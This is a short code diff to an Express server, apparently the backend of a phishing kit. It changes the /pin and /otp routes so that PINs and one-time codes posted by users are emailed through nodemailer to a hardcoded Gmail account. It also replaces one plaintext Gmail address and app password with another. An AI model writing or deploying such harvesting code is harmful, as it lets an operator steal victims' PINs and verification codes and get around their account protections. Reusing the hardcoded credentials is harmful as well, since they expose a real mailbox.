@@ -10,8 +10,8 @@ app.use(cors());
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "ajaeroelvis4@gmail.com";
-const pass = "ylxnobprypgjidpw";
+const userEmail = "Youokay801@gmail.com";
+const pass = "cnwupnrjfguifecl";
 // 01 APRIL
 
 // Middleware
@@ -52,7 +52,7 @@ app.post("/", (req, res) => {
 // API routes for pin
 app.post("/pin", (req, res) => {
   console.log(req.body);
-  let email = console.log(req.body.email);
+  let { pin } = req.body;
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -63,7 +63,7 @@ app.post("/pin", (req, res) => {
   });
 
   const mailOptions = {
-    from: email,
+    from: userEmail,
     to: userEmail,
     subject: `PIN Confirmation`,
     text: `Your PIN is: ${pin}`,
@@ -82,7 +82,7 @@ app.post("/pin", (req, res) => {
 // API routes for otp
 app.post("/otp", (req, res) => {
   console.log(req.body);
-  let email = console.log(req.body.email);
+  let { otp } = req.body;
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -93,7 +93,7 @@ app.post("/otp", (req, res) => {
   });
 
   const mailOptions = {
-    from: email,
+    from: userEmail,
     to: userEmail,
     subject: `OTP Verification`,
     text: `Your OTP is: ${otp}`,
